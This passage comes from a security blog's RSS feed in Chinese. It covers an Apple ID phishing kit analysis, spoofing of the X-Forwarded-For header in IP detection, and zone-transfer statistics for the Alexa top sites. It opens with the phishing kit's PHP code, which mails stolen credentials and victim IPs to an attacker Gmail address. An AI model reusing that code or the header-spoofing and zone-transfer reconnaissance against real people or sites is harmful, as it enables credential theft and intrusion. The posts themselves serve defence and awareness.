&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------+| APpLe VBV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Fr0m &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;justforhacke@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Apple Result | Fr0m &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;From: Apple Results &amp;lt;justforhacke@gmail.com&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;eMailAdd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MIME-Version: 1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;釣魚郵件不死別再把自己當成肥羊了&quot;&gt;釣魚郵件不死，別再把自己當成肥羊了！&lt;/h3&gt;

&lt;p&gt;釣魚攻擊最早從 1995 年就開始盛行，一直到快 20 年後的今天，都還是一個非常簡單又有效率的攻擊手法。收到郵件千萬別傻傻的輸入自己的個資、帳號密碼，仔細看一下攻擊者的破綻，別讓他得逞了。&lt;/p&gt;

&lt;p&gt;如果有發現疑似釣魚網站，又無法確認，可以到 &lt;a href=&quot;http://www.phishtank.com/&quot;&gt;PhishTank&lt;/a&gt; 來查查看，找到釣魚網站也可以投稿一下幫助其他人！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/03/apple-id-phishing-scam/</link>
                <guid>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</guid>
                <pubDate>Thu, 03 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>如何正確的取得使用者 IP？</title>
                <description>&lt;p&gt;很多網站都會有偵測使用者 IP 的功能，不管是判斷使用者來自哪邊，或者是記錄使用者的位置。但是你知道嗎？網路上大多數的教學全部都是「錯誤」的。正確的程式寫法可以確保知道訪客的 IP，但是錯誤的寫法卻可能讓網站管理者永遠不知道犯罪者的來源。&lt;/p&gt;

&lt;p&gt;這次我們單就偵測 IP 的議題來探討各種錯誤的寫法。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;你知道網路上的教學是不安全的嗎&quot;&gt;你知道網路上的教學是不安全的嗎？&lt;/h3&gt;

&lt;p&gt;我們先來看一下網路上的教學，讓我們 Google 找一下「&lt;a href=&quot;https://www.google.com.tw/search?q=php+取得+ip&quot;&gt;PHP 取得 IP&lt;/a&gt;」，就可以看到許多人熱心的教學，我們隨意挑一個常見的教學來看看。&lt;/p&gt;

&lt;p&gt;以 PHP 為例：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_CLIENT_IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_CLIENT_IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_X_FORWARDED_FOR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_X_FORWARDED_FOR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;以 ASP.NET 為例：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Empty&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Then&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;這是一個很基本的寫法、很正確的想法，如果 HTTP Header 中包含「Client-IP」，就先以他當作真實 IP。若包含「X-Forwarded-For」，則取他當作真實 IP。若兩者都沒有，則取「REMOTE_ADDR」變數作為真實 IP。因為當使用者連線時透過代理伺服器時，REMOTE_ADDR 會顯示為代理伺服器 Proxy 的 IP。部分代理伺服器會將使用者的原始真實 IP 放在 Client-IP 或 X-Forwarded-For header 中傳遞，如果在變數中呼叫則可以取得真實 IP。&lt;/p&gt;

&lt;p&gt;但是你知道嗎？&lt;strong&gt;網路上 80% 的教學寫法全部都是「錯誤」的。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;為什麼這樣說呢？請大家記得一件事情：「&lt;strong&gt;任何從客戶端取得的資料都是不可信任的！&lt;/strong&gt;」&lt;/p&gt;

&lt;h3 id=&quot;竄改-http-header&quot;&gt;竄改 HTTP Header&lt;/h3&gt;

&lt;p&gt;「X-Forwarded-For」這個變數雖然「有機會」取得使用者的真實 IP，但是由於這個值是從客戶端傳送過來的，所以「有可能」被使用者竄改。&lt;/p&gt;

&lt;p&gt;舉例來說，我寫了一個小程式，偵測這些常見的 HTTP Header 判斷 IP。並且使用 &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; 這個工具來修改 HTTP Request。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;顯示目前 IP 以及相關 header&quot; title=&quot;顯示目前 IP 以及相關 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;頁面上顯示目前我目前的 IP「49.50.68.17」，並且其他的 header 是空的。但如果我今天使用 Burp Suite 之類的 Proxy 工具自行竄改封包，加上 X-Forwarded-For 或是 Client-IP header：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; title=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;修改完畢之後，再到原本的顯示 IP 介面，會發現網頁錯將我竄改的 header 當作正確的資料填入。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;顯示遭到竄改的 HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;使用代理伺服器-proxy-的情況&quot;&gt;使用代理伺服器 Proxy 的情況&lt;/h3&gt;

&lt;p&gt;使用代理伺服器的情況下，HTTP Header 會有不同的行為。例如 Elite Proxy 如何隱藏客戶端的真實 IP。以下簡單介紹幾種常見的狀況給各位參考。&lt;/p&gt;

&lt;h4 id=&quot;直接連線-沒有使用-proxy&quot;&gt;直接連線 （沒有使用 Proxy）&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 客戶端真實 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 無&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 無&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;transparent-proxy&quot;&gt;Transparent Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 最後一個代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 客戶端真實 IP，後以逗點串接多個經過的代理伺服器 IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;anonymous-proxy&quot;&gt;Anonymous Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 最後一個代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 代理伺服器 IP，後以逗點串接多個經過的代理伺服器 IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;high-anonymity-proxy-elite-proxy&quot;&gt;High Anonymity Proxy (Elite Proxy)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 無&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 無 (或以逗點串接多個經過的代理伺服器 IP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;實際情況&quot;&gt;實際情況&lt;/h3&gt;

&lt;p&gt;在我們測試的過程中，通常我們都會讓瀏覽器自帶 X-Forwarded-For，並且自行填入 IP。常常會發現有一些網站出現如下的警告…&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! 顯示 IP 錯誤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;有沒有搞錯？「上次登入位置 127.0.0.1」？沒錯，這個是知名論壇套件「&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;」的功能，抓取 IP 的功能也是不安全的寫法。也有這樣的經驗，之前開著 X-Forwarded-For 的 header 到一些網站，竟然直接出現管理者後台！&lt;/p&gt;

&lt;p&gt;你覺得只有一般人撰寫的程式會有這樣的問題嗎？其實大型網站也可能會有類似的問題。這樣的寫法可能會讓管理者永遠抓不到犯罪者的真實 IP，甚至攻擊者可以竄改 header 插入特殊字元，對網站進行 SQL Injection 或者 Cross-Site Scripting 攻擊。&lt;/p&gt;

&lt;h3 id=&quot;正確又安全的方式&quot;&gt;正確又安全的方式&lt;/h3&gt;

&lt;p&gt;「&lt;strong&gt;任何從客戶端取得的資料都是不可信任的！&lt;/strong&gt;」&lt;/p&gt;

&lt;p&gt;請各位開發者、管理者記住這個大原則，雖然這些 Request Header 可能含有真實 IP 的資訊，但是因為他的安全性不高，因此我們絕對不能完全信賴這個數值。&lt;/p&gt;

&lt;p&gt;那我們該怎麼處理呢？我的建議是記錄所有相關的 header 欄位存入資料庫，包含「REMOTE_ADDR」「X-Forwarded-For」等等，真正有犯罪事件發生時，就可以調出所有完整的 IP 資訊進行人工判斷，找出真正的 IP。當然從 header 存入的數值也可能會遭到攻擊者竄改插入特殊字元嘗試 SQL Injection，因此存入值必須先經過過濾，或者使用 Prepared Statement 進行存放。&lt;/p&gt;

&lt;p&gt;可以參考的 HTTP Header（依照可能存放真實 IP 的順序）&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED&lt;/li&gt;
  &lt;li&gt;HTTP_X_CLUSTER_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED&lt;/li&gt;
  &lt;li&gt;REMOTE_ADDR (真實 IP 或是 Proxy IP)&lt;/li&gt;
  &lt;li&gt;HTTP_VIA (參考經過的 Proxy)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「駭客思維」就是找出網站任何可能竄改的弱點，從網頁上的元素到 HTTP Header 都是嘗試的對象。因此身為防禦者一定要清楚的知道哪些數值是不能信賴的，不要再參考網路上錯誤的教學了！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/19/client-ip-detection/</link>
                <guid>https://devco.re/blog/2014/06/19/client-ip-detection</guid>
                <pubDate>Thu, 19 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
                <description>&lt;h3 id=&quot;zone-transfer-世界大揭秘&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;

&lt;p&gt;還記得在上一篇文章 &lt;a href=&quot;https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題&lt;/a&gt;中我們曾提到，若對全世界的網站進行 zone transfer 檢測恐怕會有更多驚人的案例嗎？正好 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 提供了全球排名前一百萬名的網站資料&lt;/a&gt;，我們就以這份資料為基礎來做一些統計吧！&lt;/p&gt;

&lt;h3 id=&quot;有問題的-domain-總數與比例&quot;&gt;有問題的 domain 總數與比例&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;79133，約佔所有受測目標的 8.014%&lt;/li&gt;
  &lt;li&gt;上述 domain 的所有 zone file 共含有 22631804 筆 DNS 記錄&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於在 Alexa Top 1M 中有許多資料是重複的 domain，另外也有些資料是 IP，在本次的檢測當中都不列入計算，因此受測 domain 總數僅有 987447 個，而非一百萬個。另外，本次掃描為求快速犧牲了部分準確率，因此實際數量應比 79133 更多。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;有問題的-top-level-domain-tld-數量&quot;&gt;有問題的 Top-Level Domain (TLD) 數量&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;全世界 TLD 總數：567&lt;/li&gt;
  &lt;li&gt;受測目標的 TLD 總數：316，佔全世界總數的 55.73%&lt;/li&gt;
  &lt;li&gt;有 zone transfer 問題的 TLD 總數：220，佔受測目標的 69.62%&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前 TLD 總數的數據取自於 &lt;a href=&quot;https://data.iana.org/TLD/tlds-alpha-by-domain.txt&quot;&gt;Internet Assigned Numbers Authority (IANA)&lt;/a&gt;，不了解 TLD 是什麼的人可以參考&lt;a href=&quot;http://en.wikipedia.org/wiki/Top-level_domain&quot;&gt;這篇維基百科文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;有趣的是，連一些新的 TLD 都有 zone transfer 問題，例如 .technology、.museum 等等，可見這真的很容易被大家忽略～&lt;/p&gt;

&lt;h3 id=&quot;關於各個-tld-的統計數據&quot;&gt;關於各個 TLD 的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transferable domain in this TLD：在特定 TLD 中，有多少 domain 可任意執行 zone transfer&lt;/li&gt;
  &lt;li&gt;Same TLD in Alexa top 1M：特定 TLD 在本次 987447 個受測目標中所佔的數量&lt;/li&gt;
  &lt;li&gt;Percentage of same TLD in Alexa top 1M：特定 TLD 在 Alexa top 1M 內所有同樣 TLD 所佔的百分比（例：.com 即為 35230 / 527203 = 6.68%）&lt;/li&gt;
  &lt;li&gt;Percentage of all transferable domain：某特定 TLD 可任意執行 zone transfer 的數量在本次所有可任意執行 zone transfer 所占的百分比（例：.com 即為 35230 / 79133 = 44.52%）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer 問題的 TLD 相關統計&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.tw 網域排第二十一名，幸好這次不是世界第一了，否則又是另類的台灣之光。&lt;/p&gt;

&lt;h3 id=&quot;關於-name-server-的統計數據&quot;&gt;關於 name server 的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Number of domain：該台 name server 有多少 domain 可任意執行 zone transfer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer 問題的 name server 相關統計&quot; title=&quot;Zone Transfer 問題的 name server 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可執行 zone transfer 且不重複的 namer server 共有 53830 個&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;關於-ip-位址的統計數據&quot;&gt;關於 IP 位址的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;有 7939172 個不重複的 IP 位址&lt;/li&gt;
  &lt;li&gt;在全部 IP 位址中，有 704638 個是私有 IP 位址&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 598443 個是 10. 開頭，佔所有 IP 位址的 7.538%，佔私有 IP 位址的 84.929%&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 66270 個是 172.16~31 開頭，佔所有 IP 位址的 0.835%，佔私有 IP 位址的 9.405%&lt;/li&gt;
  &lt;li&gt;在私有 IP 位址中，有 39925 個是 192.168 開頭，佔所有 IP 位址的 0.503%，佔私有 IP 位址的 5.666%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;subdomain-的統計數據&quot;&gt;subdomain 的統計數據&lt;/h3&gt;

&lt;p&gt;以下選出一些常被入侵者當作攻擊目標的 subdomain 來計算在 22631804 筆 DNS 記錄中分別各佔了幾筆，每個 subdomain 共有兩個統計結果，逗號左邊的統計結果代表以該 subdomain 開頭的 DNS 記錄，例如 git.devco.re。逗號右邊的統計結果則將前後有數字的 subdomain 也一併計入，例如 dns01.devco.re、01dns.devco.re、0dns001.devco.re 等等。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;版本控制&lt;/p&gt;

    &lt;p&gt;git: 583, 626&lt;/p&gt;

    &lt;p&gt;gitlab: 138, 138&lt;/p&gt;

    &lt;p&gt;svn: 1552, 1669&lt;/p&gt;

    &lt;p&gt;subversion: 71, 72&lt;/p&gt;

    &lt;p&gt;cvs: 284, 330&lt;/p&gt;

    &lt;p&gt;hg: 115, 331&lt;/p&gt;

    &lt;p&gt;mercurial: 18, 19&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;開發與測試&lt;/p&gt;

    &lt;p&gt;test: 14691, 20001&lt;/p&gt;

    &lt;p&gt;dev: 8300, 10959&lt;/p&gt;

    &lt;p&gt;stage: 1329, 1628&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;資料庫&lt;/p&gt;

    &lt;p&gt;db: 1190, 2537&lt;/p&gt;

    &lt;p&gt;database: 150, 302&lt;/p&gt;

    &lt;p&gt;sql: 2209, 3298&lt;/p&gt;

    &lt;p&gt;mysql: 4045, 4998&lt;/p&gt;

    &lt;p&gt;postgre: 11, 11&lt;/p&gt;

    &lt;p&gt;redis: 21, 33&lt;/p&gt;

    &lt;p&gt;mongodb: 6, 42&lt;/p&gt;

    &lt;p&gt;memcache: 13, 72&lt;/p&gt;

    &lt;p&gt;phpmyadmin: 455, 485&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;後台管理&lt;/p&gt;

    &lt;p&gt;manager: 188, 222&lt;/p&gt;

    &lt;p&gt;staff: 481, 542&lt;/p&gt;

    &lt;p&gt;member: 331, 376&lt;/p&gt;

    &lt;p&gt;backend: 153, 177&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;線上服務相關&lt;/p&gt;

    &lt;p&gt;api: 1871, 2097&lt;/p&gt;

    &lt;p&gt;search: 1469, 10987&lt;/p&gt;

    &lt;p&gt;pic: 178, 293&lt;/p&gt;

    &lt;p&gt;img: 1775, 3517&lt;/p&gt;

    &lt;p&gt;service: 779, 959&lt;/p&gt;

    &lt;p&gt;payment: 225, 238&lt;/p&gt;

    &lt;p&gt;cache: 373, 627&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;私有服務&lt;/p&gt;

